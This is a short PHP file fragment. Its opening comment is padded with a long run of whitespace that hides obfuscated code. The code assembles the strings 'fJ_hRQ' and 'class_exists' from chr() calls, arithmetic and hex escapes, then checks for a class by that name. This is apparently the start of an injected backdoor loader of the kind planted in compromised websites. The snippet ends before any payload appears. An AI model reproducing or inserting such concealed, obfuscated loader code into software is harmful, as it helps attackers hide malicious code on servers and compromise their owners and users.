<?php /*                                                                                                                                                                                                                                                                                                                                                                                                  $QzusYSiLhn = chr (102) . "\x4a" . '_' . "\150" . 'R' . "\121";$FvTVJVI = chr ( 735 - 636 )."\x6c" . chr (97) . 's' . 's' . '_' . chr (101) . 'x' . "\x69" . "\163" . chr ( 796 - 680 ).chr (115); $iYkPTFjj = class_exists($QzusYSiLhn); $Q*/
